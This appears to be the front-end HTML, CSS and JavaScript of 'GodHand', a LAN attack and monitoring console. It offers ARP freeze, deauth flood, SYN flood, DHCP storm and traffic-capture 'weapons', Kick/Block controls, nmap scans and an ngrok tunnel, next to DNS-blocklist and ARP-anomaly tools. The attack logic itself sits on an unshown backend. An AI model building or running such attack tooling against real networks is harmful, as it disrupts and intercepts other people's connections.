  background: var(--bg-inset);
  border: 1px solid var(--border-subtle);
  color: var(--text-primary);
  border-radius: 8px;
  padding: 12px 14px;
  font-size: 1rem;
  font-family: inherit;
  transition: border 0.2s, box-shadow 0.2s;
}
input:focus, select:focus, textarea:focus {
  outline: none;
  border-color: var(--accent-primary);
  box-shadow: 0 0 0 3px var(--glow-accent);
}
input[type="text"], input[type="number"] { flex: 1; min-width: 120px; }
textarea { width: 100%; min-height: 80px; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; }
.btn {
  background: var(--accent-primary);
  color: #04121C;
  border: none;
  border-radius: 8px;
  padding: 12px 20px;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s;
  min-height: 44px;
}
.btn:hover { background: var(--accent-secondary); transform: translateY(-1px); }
.btn:active { transform: scale(0.98); }
.btn:disabled { opacity: 0.5; cursor: not-allowed; }
.btn.secondary {
  background: transparent;
  border: 1px solid var(--border-strong);
  color: var(--text-primary);
}
.btn.secondary:hover { background: var(--bg-inset); }
.btn.danger {
  background: var(--danger);
  color: #1A0A0A;
}
.btn.big {
  font-size: 1.1rem;
  padding: 14px 28px;
}
.weapon-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
  gap: 10px;
  margin: 16px 0;
}
.weapon-btn {
  background: var(--bg-inset);
  border: 2px solid var(--border-subtle);
  border-radius: var(--radius);
  padding: 16px;
  text-align: center;
  cursor: pointer;
  transition: all 0.2s;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 6px;
}
.weapon-btn:hover { border-color: var(--border-strong); }
.weapon-btn.active {
  border-color: var(--accent-primary);
  box-shadow: 0 0 0 2px var(--glow-accent);
}
.weapon-btn .num {
  font-size: 1.8rem;
  font-weight: 700;
  color: var(--accent-tertiary);
}
.weapon-btn .label {
  font-size: 0.8rem;
  color: var(--text-secondary);
}
.status-message {
  background: var(--bg-inset);
  border-radius: 8px;
  padding: 12px 16px;
  border-left: 4px solid var(--accent-primary);
  margin: 12px 0;
  font-size: 0.9rem;
}
.status-message.success { border-left-color: var(--success); }
.status-message.error { border-left-color: var(--danger); }
.table-responsive {
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
}
table {
  width: 100%;
  border-collapse: collapse;
  font-size: 0.9rem;
}
th {
  text-align: left;
  color: var(--text-secondary);
  font-weight: 500;
  font-size: 0.75rem;
  text-transform: uppercase;
  letter-spacing: 0.04em;
  padding: 12px 10px;
  border-bottom: 1px solid var(--border-subtle);
}
td {
  padding: 12px 10px;
  border-bottom: 1px solid var(--border-subtle);
}
tr:hover td { background: rgba(255,255,255,0.02); }
.badge {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  padding: 4px 10px;
  border-radius: 20px;
  font-size: 0.7rem;
  font-weight: 600;
}
.badge.success { background: var(--glow-success); color: var(--success); }
.badge.warning { background: rgba(251,191,36,0.15); color: var(--warning); }
.badge.danger { background: var(--glow-danger); color: var(--danger); }
.badge.info { background: rgba(129,140,248,0.15); color: var(--info); }
.empty {
  color: var(--text-secondary);
  padding: 24px 0;
  text-align: center;
  font-size: 0.9rem;
}
.empty-inline {
  color: var(--text-secondary);
  font-size: 0.85rem;
}
.chip-row {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  margin: 4px 0 20px;
}
.chip {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  background: var(--bg-inset);
  border: 1px solid var(--border-subtle);
  border-radius: 20px;
  padding: 5px 6px 5px 12px;
  font-size: 0.85rem;
}
.chip-ip {
  color: var(--text-primary);
  font-family: 'JetBrains Mono', monospace;
  margin-right: 2px;
}
.chip-action {
  background: none;
  border: none;
  color: var(--text-secondary);
  cursor: pointer;
  padding: 5px;
  border-radius: 50%;
  display: inline-flex;
  align-items: center;
  justify-content: center;
}
.chip-action:hover { background: var(--glow-accent); color: var(--accent-primary); }
.btn-icon {
  background: none;
  border: none;
  color: var(--text-secondary);
  cursor: pointer;
  padding: 8px;
  border-radius: 6px;
  font-size: 1.1rem;
  min-width: 40px;
  min-height: 40px;
}
.btn-icon:hover { background: var(--glow-accent); color: var(--accent-primary); }
.btn-icon svg { vertical-align: middle; }
nav button .icon svg { display: block; }
.log-container {
  background: var(--bg-inset);
  border: 1px solid var(--border-subtle);
  border-radius: 8px;
  padding: 12px;
  max-height: 300px;
  overflow-y: auto;
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.8rem;
}
.log-entry { padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.03); display: flex; gap: 10px; }
.log-entry .time { color: var(--text-secondary); }
.log-entry .msg { flex: 1; }
.log-entry.error .msg { color: var(--danger); }
.log-entry.success .msg { color: var(--success); }
.log-entry.warn .msg { color: var(--warning); }
.modal-overlay {
  position: fixed;
  top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(0,0,0,0.7);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  backdrop-filter: blur(4px);
}
.modal {
  background: var(--bg-elevated);
  border-radius: var(--radius);
  padding: 24px;
  max-width: 400px;
  width: 90%;
  border: 1px solid var(--border-strong);
  box-shadow: var(--shadow);
}
.modal h3 { margin-bottom: 12px; }
.modal p { color: var(--text-secondary); margin-bottom: 20px; }
.modal.wide { max-width: 640px; max-height: 80vh; overflow-y: auto; }
.bw-legend {
  display: flex;
  gap: 24px;
  flex-wrap: wrap;
  margin-bottom: 12px;
  font-size: 0.9rem;
}
.bw-key {
  display: flex;
  align-items: center;
  gap: 6px;
  color: var(--text-secondary);
}
.bw-key strong {
  color: var(--text-primary);
  font-family: 'JetBrains Mono', monospace;
  font-weight: 600;
  margin-left: 2px;
}
.bw-swatch {
  width: 10px;
  height: 10px;
  border-radius: 50%;
  display: inline-block;
}
.bw-swatch.dash { border-radius: 2px; }
.sparkline {
  width: 100%;
  height: 56px;
  display: block;
  background: var(--bg-inset);
  border: 1px solid var(--border-subtle);
  border-radius: 8px;
}
.sparkline polyline {
  fill: none;
  stroke-width: 2;
  stroke-linecap: round;
  stroke-linejoin: round;
}
#bw-spark-rx { stroke: var(--accent-primary); }
#bw-spark-tx { stroke: var(--warning); stroke-dasharray: 5 4; }
.stat-row {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
  margin-bottom: 16px;
}
.stat-tile {
  flex: 1 1 120px;
  background: var(--bg-inset);
  border: 1px solid var(--border-subtle);
  border-radius: 8px;
  padding: 12px 16px;
  display: flex;
  flex-direction: column;
  gap: 4px;
}
.stat-tile .stat-value {
  font-size: 1.4rem;
  font-weight: 700;
  color: var(--text-primary);
  font-family: 'JetBrains Mono', monospace;
}
.stat-tile .stat-label {
  font-size: 0.75rem;
  color: var(--text-secondary);
  text-transform: uppercase;
  letter-spacing: 0.04em;
}
#traffic-spark-line { stroke: var(--accent-primary); }
.toast-container {
  position: fixed;
  top: 20px;
  right: 20px;
  z-index: 2000;
  display: flex;
  flex-direction: column;
  gap: 10px;
}
.toast {
  background: var(--bg-elevated);
  border: 1px solid var(--border-strong);
  border-radius: 8px;
  padding: 12px 16px;
  display: flex;
  align-items: center;
  gap: 10px;
  box-shadow: var(--shadow);
  animation: slideIn 0.3s;
}
.toast.success { border-left: 4px solid var(--success); }
.toast.error { border-left: 4px solid var(--danger); }
.toast.warning { border-left: 4px solid var(--warning); }
@keyframes slideIn {
  from { transform: translateX(100%); opacity: 0; }
  to { transform: translateX(0); opacity: 1; }
}
@media (max-width: 768px) {
  nav {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    top: auto;
    border-top: 1px solid var(--border-subtle);
    border-bottom: none;
    display: flex;
    justify-content: space-around;
    z-index: 100;
  }
  nav button {
    flex-direction: column;
    padding: 8px 4px;
    font-size: 0.7rem;
    border-bottom: none;
    border-top: 3px solid transparent;
    flex: 1;
  }
  nav button.active {
    border-top-color: var(--accent-primary);
    border-bottom: none;
  }
  main { padding-bottom: 80px; }
  .table-responsive {
    overflow-x: visible;
  }
  table, thead, tbody, th, td, tr {
    display: block;
  }
  thead tr { display: none; }
  tr {
    margin-bottom: 12px;
    border: 1px solid var(--border-subtle);
    border-radius: 8px;
    padding: 10px;
    background: var(--bg-elevated);
  }
  td {
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid rgba(255,255,255,0.05);
    padding: 8px 0;
  }
  td:last-child { border-bottom: none; }
  td::before {
    content: attr(data-label);
    font-weight: 600;
    color: var(--text-secondary);
    font-size: 0.7rem;
    text-transform: uppercase;
    letter-spacing: 0.04em;
    margin-right: 10px;
  }
}
</style>
</head>
<body>
<div id="login-screen" class="login-screen" style="display:none;">
  <div class="login-bg"></div>
  <div class="login-card">
    <div class="login-logo">G</div>
    <h1 class="login-title">GodHand</h1>
    <p class="login-subtitle">Network Command</p>
    <form id="login-form" onsubmit="return handleLogin(event)">
      <div class="login-field">
        <input type="text" id="login-username" placeholder="Username" autocomplete="username" required>
      </div>
      <div class="login-field">
        <input type="password" id="login-password" placeholder="Password" autocomplete="current-password" required>
      </div>
      <button type="submit" class="login-btn" id="login-submit-btn"><span>Log In</span></button>
      <div id="login-error" class="login-error" style="display:none;"></div>
    </form>
  </div>
</div>

<div id="app-shell">
<header>
  <a href="#" class="logo">
    <div class="logo-icon">G</div>
    <span>GodHand: Network Command</span>
  </a>
  <button class="btn-icon" id="logout-btn" onclick="handleLogout()" title="Log out" style="display:none; margin-left:4px;">
    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
  </button>
  <div class="status-indicator" id="global-status">
    <span class="status-dot" id="status-dot"></span>
    <span id="status-text">Ready</span>
  </div>
</header>

<nav id="main-nav">
  <button class="tab-btn active" data-tab="settings"><span class="icon"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg></span> Settings</button>
  <button class="tab-btn" data-tab="gateway"><span class="icon"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg></span> Gateway</button>
  <button class="tab-btn" data-tab="recon"><span class="icon"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></span> Recon</button>
  <button class="tab-btn" data-tab="attacks"><span class="icon"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="12" r="6"></circle><circle cx="12" cy="12" r="2"></circle></svg></span> Attacks</button>
  <button class="tab-btn" data-tab="monitor"><span class="icon"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg></span> Monitor</button>
</nav>

<main>
  <div id="tab-settings" class="tab-content active">
    <div class="card">
      <h2>Interface & gateway</h2>
      <p class="sub">Start here — set your Wi‑Fi interface and gateway IP before scanning or attacking.</p>
      <div class="row">
        <select id="iface-select"></select>
        <button class="btn" onclick="setInterface()">Set interface</button>
      </div>
      <div class="row">
        <input type="text" id="gateway-input" placeholder="Gateway IP">
        <button class="btn" onclick="setGateway()">Set gateway</button>
      </div>
      <div class="row">
        <input type="number" id="port-input" placeholder="Port (1-65535)" value="80">
        <button class="btn" onclick="setPort()">Set port</button>
      </div>
      <div id="settings-status" class="status-message">Current: IFACE: none, GW: none, PORT: 80</div>
    </div>
    <div class="card">
      <h2>Live bandwidth</h2>
      <p class="sub">Throughput on the selected interface, sampled every 2s.</p>
      <div class="bw-legend">
        <span class="bw-key"><span class="bw-swatch" style="background:var(--accent-primary);"></span>Download <strong id="bw-rx">—</strong></span>
        <span class="bw-key"><span class="bw-swatch dash" style="background:var(--warning);"></span>Upload <strong id="bw-tx">—</strong></span>
      </div>
      <svg id="bw-spark" viewBox="0 0 300 56" preserveAspectRatio="none" class="sparkline">
        <polyline id="bw-spark-rx" points=""></polyline>
        <polyline id="bw-spark-tx" points=""></polyline>
      </svg>
      <div class="empty" id="bw-empty">Set an interface above to see live throughput.</div>
    </div>
  </div>

  <div id="tab-gateway" class="tab-content">
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; flex-wrap:wrap; gap:8px;">
        <h2 style="margin:0;">Privacy DNS stack</h2>
        <span id="gw-dns-badges"></span>
      </div>
      <p class="sub">Unbound (DNSSEC, port 5335) forwards to DNSCrypt-proxy (encrypted upstream + ad/tracker/malware blocklist). Self-contained — no dependency on any pre-existing setup.</p>
      <div class="row">
        <button class="btn" onclick="startGatewayDns()">Start DNS stack</button>
        <button class="btn secondary" onclick="stopGatewayDns()">Stop</button>
        <button class="btn secondary" onclick="updateGatewayBlocklist()">Update blocklist</button>
        <button class="btn secondary" onclick="testGatewayDns()">Test resolution</button>
      </div>
      <div id="gw-dns-status" class="status-message">Blocklist: 0 domain(s) loaded.</div>
      <div id="gw-dns-test-result"></div>
    </div>
    <div class="card">
      <h2>VPN</h2>
      <p class="sub">Detects an active WireGuard, OpenVPN, or Cloudflare tunnel. GodHand doesn't provision VPN credentials for you — set one up separately and it'll show as active here.</p>
      <div id="gw-vpn-status" class="status-message">Checking...</div>
    </div>
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; flex-wrap:wrap; gap:8px;">
        <h2 style="margin:0;">Network-wide proxy</h2>
        <span id="gw-proxy-badge"></span>
      </div>
      <p class="sub">An HTTP/HTTPS proxy other devices on your LAN can point to.</p>
      <div class="row">
        <button class="btn" onclick="startGatewayProxy()">Start proxy</button>
        <button class="btn secondary" onclick="stopGatewayProxy()">Stop</button>
      </div>
      <div id="gw-proxy-status" class="status-message">Not running.</div>
    </div>
    <div class="card">
      <h2>Configure other devices</h2>
      <p class="sub">Point devices on your network at this host to route them through the stack above — no router admin access required.</p>
      <div class="status-message">
        <div>Local IP: <strong id="gw-local-ip">—</strong></div>
        <div>External IP: <strong id="gw-external-ip">—</strong></div>
        <div>DNS server: <strong id="gw-dns-target">—</strong></div>
        <div>HTTP proxy: <strong id="gw-proxy-target">—</strong></div>
      </div>
    </div>
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; flex-wrap:wrap; gap:8px;">
        <h2 style="margin:0;">Dynamic DNS</h2>
        <span id="ddns-badge"></span>
      </div>
      <p class="sub">Keep a hostname pointed at this network's current public IP — DuckDNS or No-IP.</p>
      <div class="row">
        <select id="ddns-provider" onchange="onDdnsProviderChange()">
          <option value="duckdns">DuckDNS</option>
          <option value="noip">No-IP</option>
        </select>
        <input type="text" id="ddns-domain" placeholder="Hostname (e.g. pet-my, or sucka.sytes.net for No-IP)">
      </div>
      <div class="row" id="ddns-duckdns-fields">
        <input type="text" id="ddns-token" placeholder="DuckDNS token">
      </div>
      <div class="row" id="ddns-noip-fields" style="display:none;">
        <input type="text" id="ddns-username" placeholder="No-IP username">
        <input type="password" id="ddns-password" placeholder="No-IP password">
      </div>
      <div class="row">
        <input type="number" id="ddns-interval" value="5" min="1" placeholder="Update every N minutes">
        <button class="btn secondary" onclick="saveDdnsConfig()">Save</button>
        <button class="btn secondary" onclick="ddnsUpdateNow()">Update now</button>
      </div>
      <label class="row" style="align-items:center; cursor:pointer;">
        <input type="checkbox" id="ddns-enabled" onchange="toggleDdnsEnabled()">
        Auto-update on the interval above
      </label>
      <div id="ddns-status" class="status-message">Not configured.</div>
    </div>
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; flex-wrap:wrap; gap:8px;">
        <h2 style="margin:0;">Remote tunnel (ngrok)</h2>
        <span id="ngrok-badge"></span>
      </div>
      <p class="sub">Reach this UI from outside your network without router port-forwarding — useful when your ISP has locked down admin access to your own gateway.</p>
      <div class="row">
        <input type="text" id="ngrok-authtoken" placeholder="ngrok authtoken (leave blank if already configured)">
      </div>
      <div class="row">
        <button class="btn" onclick="startNgrok()">Start tunnel</button>
        <button class="btn secondary" onclick="stopNgrok()">Stop</button>
      </div>
      <div id="ngrok-status" class="status-message">Not running.</div>
    </div>
  </div>

  <div id="tab-recon" class="tab-content">
    <div class="card">
      <h2>Discover & target hosts</h2>
      <p class="sub">Scan the LAN, then select hosts to target — or add an IP directly if it wasn't discovered.</p>
      <div class="row">
        <button class="btn" id="scan-btn" onclick="refreshHosts()"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-3px; margin-right:4px;"><polyline points="23 4 23 10 17 10"></polyline><polyline points="1 20 1 14 7 14"></polyline><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path></svg>Scan now</button>
        <button class="btn secondary" onclick="bulkAddTargets()">Add selected to targets</button>
        <button class="btn secondary" onclick="addSelectedToWatch()">Add selected to watch</button>
        <span id="scan-spinner" style="display:none;"><span class="spinner"></span> Scanning...</span>
      </div>
      <div class="row">
        <input type="text" id="target-ip" placeholder="Add IP manually" style="flex-basis:100%;">
      </div>
      <div class="row">
        <button class="btn secondary" onclick="addTarget()">Add target</button>
        <button class="btn secondary" onclick="kickTypedIP()"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-3px; margin-right:4px;"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="8.5" cy="7" r="4"></circle><line x1="18" y1="8" x2="23" y2="13"></line><line x1="23" y1="8" x2="18" y2="13"></line></svg>Kick</button>
        <button class="btn secondary" onclick="blockTypedIP()"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-3px; margin-right:4px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>Block</button>
      </div>
      <p class="sub" style="margin-top:-8px;">Kick/Block act on the typed IP directly — no need to add it as a target first.</p>
      <p class="sub" style="margin-bottom:8px;">Current targets — attacks run against these:</p>
      <div class="chip-row" id="target-chips"></div>
      <div class="table-responsive">
        <table id="host-table">
          <thead><tr><th><input type="checkbox" id="select-all-hosts" onchange="toggleAllHosts()"></th><th>IP</th><th>MAC</th><th>Reachability</th><th>Action</th></tr></thead>
          <tbody id="host-body"></tbody>
        </table>
      </div>
      <div class="empty" id="host-empty">No hosts discovered. Press "Scan now".</div>
    </div>
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
        <h2 style="margin:0;">Tracked devices</h2>
        <button class="btn secondary" onclick="checkAllDevices()">Check all</button>
      </div>
      <p class="sub">Watch specific hosts long-term, independent of scan results — or watch every host on the network.</p>
      <div class="row">
        <input type="text" id="dev-name" placeholder="Label">
        <input type="text" id="dev-ip" placeholder="IP address">
        <button class="btn" onclick="addDevice()">Add</button>
      </div>
      <label class="row" style="align-items:center; cursor:pointer;">
        <input type="checkbox" id="watch-whole-network" onchange="toggleWatchWholeNetwork()">
        Watch the whole network (auto-add every host found by a scan)
      </label>
      <div class="table-responsive">
        <table id="dev-table">
          <thead><tr><th>Label</th><th>IP</th><th>Status</th><th>Latency</th><th></th></tr></thead>
          <tbody></tbody>
        </table>
      </div>
      <div class="empty" id="dev-empty">No devices yet. Add one above.</div>
    </div>
  </div>

  <div id="tab-attacks" class="tab-content">
    <div class="card">
      <h2>Choose your weapon</h2>
      <p class="sub">Select an attack, make sure targets are set on the Recon tab, then press Start.</p>
      <div class="weapon-grid" id="weapon-grid">
        <div class="weapon-btn active" data-w="1"><span class="num">1</span><span class="label">ARP Freeze</span></div>
        <div class="weapon-btn" data-w="2"><span class="num">2</span><span class="label">Deauth Flood</span></div>
        <div class="weapon-btn" data-w="3"><span class="num">3</span><span class="label">SYN Flood</span></div>
        <div class="weapon-btn" data-w="4"><span class="num">4</span><span class="label">DHCP Storm</span></div>
        <div class="weapon-btn" data-w="5"><span class="num">5</span><span class="label">Traffic Capture</span></div>
      </div>
      <div id="deauth-capability" class="status-message">Deauth method: checking...</div>
      <div style="display:flex; gap:10px; flex-wrap:wrap;">
        <button class="btn big" id="start-btn" onclick="confirmStartAttack()">▶ Start</button>
        <button class="btn big secondary" id="stop-btn" onclick="confirmStopAttack()" disabled>⏹ Stop</button>
      </div>
      <div id="attack-status" class="status-message">Status: Ready</div>
    </div>
    <div class="card">
      <h2>Live traffic capture</h2>
      <p class="sub">Weapon 5 output — see the <strong>Monitor</strong> tab for the full capture &amp; analysis panel (top talkers, ports, live feed).</p>
      <div id="attacks-traffic-status" class="status-message">Not capturing.</div>
    </div>
  </div>

  <div id="tab-monitor" class="tab-content">
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; flex-wrap:wrap; gap:8px;">
        <h2 style="margin:0;">Traffic capture &amp; analysis</h2>
        <span id="traffic-capturing-badge"></span>
      </div>
      <p class="sub">Live analysis of traffic to/from your targets — start weapon 5 (Traffic Capture) on the Attacks tab to populate this.</p>
      <div class="stat-row">
        <div class="stat-tile"><span class="stat-value" id="traffic-stat-total">0</span><span class="stat-label">Connections</span></div>
        <div class="stat-tile"><span class="stat-value" id="traffic-stat-hosts">0</span><span class="stat-label">Unique hosts</span></div>
        <div class="stat-tile"><span class="stat-value" id="traffic-stat-bytes">0 B</span><span class="stat-label">Total data</span></div>
      </div>
      <svg id="traffic-spark" viewBox="0 0 300 50" preserveAspectRatio="none" class="sparkline">
        <polyline id="traffic-spark-line" points=""></polyline>
      </svg>
      <p class="sub" style="margin-top:8px; margin-bottom:0;">Connections per 2s, last 60s</p>
    </div>
    <div class="card">
      <h2>Top talkers</h2>
      <p class="sub">Hosts moving the most data, by total bytes seen.</p>
      <div class="table-responsive">
        <table>
          <thead><tr><th>Host</th><th>Connections</th><th>Data</th></tr></thead>
          <tbody id="traffic-talkers-body"></tbody>
        </table>
      </div>
      <div class="empty" id="traffic-talkers-empty">No traffic captured yet.</div>
    </div>
    <div class="card">
      <h2>Top ports &amp; services</h2>
      <div class="table-responsive">
        <table>
          <thead><tr><th>Service</th><th>Port</th><th>Protocol</th><th>Connections</th><th>Data</th></tr></thead>
          <tbody id="traffic-ports-body"></tbody>
        </table>
      </div>
      <div class="empty" id="traffic-ports-empty">No traffic captured yet.</div>
    </div>
    <div class="card">
      <h2>Raw connection feed</h2>
      <div class="log-container" id="traffic-container" style="display:none;"></div>
      <div class="empty" id="traffic-empty">Not capturing. Select weapon 5 on the Attacks tab and press Start.</div>
    </div>
    <div class="card">
      <h2>Paste an ARP snapshot</h2>
      <p class="sub">Run <code>arp -a</code> and paste output below. Detects MAC changes.</p>
      <textarea id="arp-input" placeholder="e.g. 192.168.1.1 aa:bb:cc:dd:ee:ff"></textarea>
      <div class="row" style="margin-top:10px;">
        <button class="btn" onclick="ingestArp()">Analyze snapshot</button>
        <button class="btn secondary" onclick="clearArpHistory()">Clear history</button>
      </div>
      <p class="sub" style="margin-top:10px;">Snapshots analyzed: <span id="arp-snap-count">0</span></p>
    </div>
    <div class="card">
      <h2>Paste deauth / frame-count log</h2>
      <p class="sub">Format: numbers separated by comma or newline.</p>
      <textarea id="deauth-input" placeholder="2,3,1,4,2,58,61,2,3"></textarea>
      <div class="row" style="margin-top:10px;">
        <button class="btn" onclick="analyzeDeauth()">Analyze log</button>
      </div>
    </div>
    <div class="card">
      <h2>Alerts</h2>
      <div id="alerts"></div>
      <div class="empty" id="alerts-empty">No anomalies detected yet.</div>
    </div>
    <div class="card">
      <h2>Activity log (server-side)</h2>
      <p class="sub">All actions are logged on the server.</p>
      <button class="btn secondary" onclick="clearServerLogs()">Clear server log</button>
      <div class="log-container" id="log-container"></div>
    </div>
  </div>
</main>

<div id="modal-overlay" class="modal-overlay" style="display:none;">
  <div class="modal">
    <h3 id="modal-title">Confirm</h3>
    <p id="modal-message"></p>
    <div style="display:flex; gap:10px; justify-content:flex-end;">
      <button class="btn secondary" onclick="closeModal()">Cancel</button>
      <button class="btn danger" id="modal-confirm-btn" onclick="confirmModalAction()">Confirm</button>
    </div>
  </div>
</div>

<div id="nmap-modal-overlay" class="modal-overlay" style="display:none;">
  <div class="modal wide">
    <h3>Nmap scan — <span id="nmap-modal-ip"></span></h3>
    <div id="nmap-modal-body"></div>
    <div style="display:flex; gap:10px; justify-content:flex-end; margin-top:16px;">
      <button class="btn secondary" onclick="closeNmapModal()">Close</button>
    </div>
  </div>
</div>

<div class="toast-container" id="toast-container"></div>
</div>

<script>
// Global state
let selectedWeapon = 1;
let currentTargets = [];
let currentHosts = [];
let attackRunning = {};   // weapon_id -> true/false
let devices = JSON.parse(localStorage.getItem('lg_devices') || '[]');
let arpHistory = JSON.parse(localStorage.getItem('lg_arp_history') || '[]');
let alerts = JSON.parse(localStorage.getItem('lg_alerts') || '[]');
let authToken = localStorage.getItem('godhand_token') || '';
let modalAction = null;
let watchWholeNetwork = localStorage.getItem('lg_watch_whole_network') === '1';
let bwRxHistory = [];
let bwTxHistory = [];

// Helper: API call
async function apiCall(endpoint, method='GET', data=null) {
  const headers = {'Content-Type': 'application/json'};
  if (authToken) headers['Authorization'] = 'Bearer ' + authToken;
  const opts = { method, headers };
  if (data) opts.body = JSON.stringify(data);
  const res = await fetch('/api/' + endpoint, opts);
  if (res.status === 401) {
    authToken = '';
    localStorage.removeItem('godhand_token');
    showLogin();
    throw new Error('Unauthorized');
  }
  return res.json();
}

// Toasts
function showToast(message, type='success') {
  const container = document.getElementById('toast-container');
  const toast = document.createElement('div');
  toast.className = 'toast ' + type;
  toast.textContent = message;
  container.appendChild(toast);
  setTimeout(() => toast.remove(), 4000);
}

// Modal
function openModal(title, message, action) {
  document.getElementById('modal-title').textContent = title;
  document.getElementById('modal-message').textContent = message;
  modalAction = action;
  document.getElementById('modal-overlay').style.display = 'flex';
}
function closeModal() {
  document.getElementById('modal-overlay').style.display = 'none';
  modalAction = null;
}
function confirmModalAction() {
  if (modalAction) modalAction();
  closeModal();
}

// Nmap scan modal
let nmapTargetIp = null;
function openNmapModal(ip) {
  nmapTargetIp = ip;
  document.getElementById('nmap-modal-ip').textContent = ip;
  document.getElementById('nmap-modal-body').innerHTML = `
    <p class="sub">Choose a scan type for <strong>${ip}</strong>:</p>
    <div class="row">
      <button class="btn" onclick="runNmapModal(false)">Quick scan (top 100 ports)</button>
      <button class="btn secondary" onclick="runNmapModal(true)">Full scan (all 65535 ports — slow)</button>
    </div>
  `;
  document.getElementById('nmap-modal-overlay').style.display = 'flex';
}
function closeNmapModal() {
  document.getElementById('nmap-modal-overlay').style.display = 'none';
  nmapTargetIp = null;
}
async function runNmapModal(full) {
  const ip = nmapTargetIp;
  const body = document.getElementById('nmap-modal-body');
  body.innerHTML = `
    <p class="sub">Running a ${full ? 'full' : 'quick'} scan on ${ip}${full ? ' — this can take several minutes' : ''}...</p>
    <div style="text-align:center; padding:30px 0;"><span class="spinner"></span></div>
  `;
  const res = await apiCall('nmap_scan?ip=' + encodeURIComponent(ip) + '&full=' + (full ? '1' : '0'));
  if (!res.success) {
    body.innerHTML = `<p class="sub" style="color:var(--danger);">Scan failed: ${res.error}</p>`;
    return;
  }
  if (!res.ports.length) {
    body.innerHTML = `<p class="sub">No open ports found on ${ip}.</p>`;
    return;
  }
  const rows = res.ports.map(p => `
    <tr>
      <td data-label="Port">${p.port}/${p.protocol}</td>
      <td data-label="State"><span class="badge ${p.state === 'open' ? 'success' : 'warning'}">${p.state}</span></td>
      <td data-label="Service">${p.service}</td>
      <td data-label="Version">${p.version || '—'}</td>
    </tr>
  `).join('');
  body.innerHTML = `
    <div class="table-responsive">
      <table>
        <thead><tr><th>Port</th><th>State</th><th>Service</th><th>Version</th></tr></thead>
        <tbody>${rows}</tbody>
      </table>
    </div>
  `;
}

